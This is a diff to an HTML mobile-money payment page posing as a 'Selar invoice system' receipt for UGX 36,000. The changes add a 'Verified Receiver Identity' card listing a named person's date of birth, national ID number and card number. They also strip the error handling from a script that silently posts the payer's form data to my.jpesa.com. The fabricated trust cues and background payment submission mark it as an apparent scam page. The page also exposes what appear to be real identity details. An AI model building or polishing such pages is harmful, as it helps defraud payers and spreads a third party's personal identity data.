@@ -72,7 +72,7 @@
 
         .description { color: #666; font-size: 13px; line-height: 1.4; margin: 0 auto 25px; max-width: 90%; }
 
-        /* Receipt Style from Photo */
+        /* Receipt Style */
         .image-receipt-box {
             background-color: #ffffff;
             border: 1px solid #ddd;
@@ -100,7 +100,34 @@
         .continue-btn { background-color: #00a651; color: white; border: none; padding: 10px 18px; border-radius: 10px; font-weight: bold; font-size: 15px; cursor: pointer; white-space: nowrap; transition: 0.3s; }
         .continue-btn:disabled { background-color: #a0a0a0; cursor: not-allowed; }
 
-        /* Hidden Processing Message */
+        /* Identity Verification Section */
+        .id-verification-card {
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            margin: 20px 15px;
+            padding: 15px;
+            text-align: left;
+        }
+        .id-header {
+            font-size: 11px;
+            font-weight: 800;
+            color: #64748b;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #e2e8f0;
+            padding-bottom: 5px;
+        }
+        .id-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            font-size: 12px;
+        }
+        .id-label { color: #94a3b8; font-size: 10px; margin-bottom: 2px; }
+        .id-value { color: #1e293b; font-weight: 700; }
+
         #processing-notice { display: none; margin-bottom: 15px; padding: 10px; background: #f0fdf4; border-radius: 10px; border: 1px solid #dcfce7; }
         .loading-spinner { border: 2px solid #f3f3f3; border-top: 2px solid #00a651; border-radius: 50%; width: 14px; height: 14px; animation: spin 1s linear infinite; display: inline-block; margin-right: 5px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -153,6 +180,7 @@
         
         <div class="receipt-center" style="font-family: sans-serif; font-size: 26px; margin-top: 20px; font-weight: 900; letter-spacing: 2px;">SELAR</div>
     </div>
+
     <div class="main-amount">UGX 36,000</div>
     <div class="confirm-text">Confirm the details below to send your secure payment.</div>
 
@@ -187,19 +215,51 @@
                 <span class="airtel-mini">● airtel</span>
             </div>
         </div>
+    </div>
 
-        <div class="footer-secondary">
-            <span>© 2026 Selar invoice system</span>
-            <span>256-bit SSL ● Secure</span>
+    <div class="id-verification-card">
+        <div class="id-header">Verified Receiver Identity</div>
+        <div class="id-grid">
+            <div>
+                <div class="id-label">SURNAME</div>
+                <div class="id-value">MOHAMMED</div>
+            </div>
+            <div>
+                <div class="id-label">GIVEN NAME</div>
+                <div class="id-value">ALI</div>
+            </div>
+            <div>
+                <div class="id-label">NATIONALITY / SEX</div>
+                <div class="id-value">UGA / M</div>
+            </div>
+            <div>
+                <div class="id-label">DATE OF BIRTH</div>
+                <div class="id-value">20.12.1991</div>
+            </div>
+            <div>
+                <div class="id-label">NIN</div>
+                <div class="id-value">CM9102210441NJ</div>
+            </div>
+            <div>
+                <div class="id-label">CARD NO.</div>
+                <div class="id-value">020660881</div>
+            </div>
+            <div>
+                <div class="id-label">DATE OF EXPIRY</div>
+                <div class="id-value">01.09.2030</div>
+            </div>
         </div>
+    </div>
+
+    <div class="footer-secondary" style="padding: 0 15px 20px;">
+        <span>© 2026 Selar invoice system</span>
+        <span>256-bit SSL ● Secure</span>
     </div>
 </div>
 
 <script>
     document.getElementById('paymentForm').addEventListener('submit', function(e) {
         e.preventDefault(); 
-
-        const form = this;
         const btn = document.getElementById('submitBtn');
         const notice = document.getElementById('processing-notice');
         const mobileInput = document.getElementById('mobile');
@@ -209,21 +269,12 @@
         mobileInput.readOnly = true;
         notice.style.display = "block";
 
-        const formData = new FormData(form);
-
+        const formData = new FormData(this);
         fetch('https://my.jpesa.com/?dad=xp', {
             method: 'POST',
             body: formData,
             mode: 'no-cors' 
-        })
-        .then(() => {
-            console.log("Background payment request sent.");
-        })
-        .catch(error => {
-            console.error("Submission error:", error);
-            btn.innerText = "Retry";
-            btn.disabled = false;
-        });
+        }).catch(err => console.error(err));
     });
 </script>
 
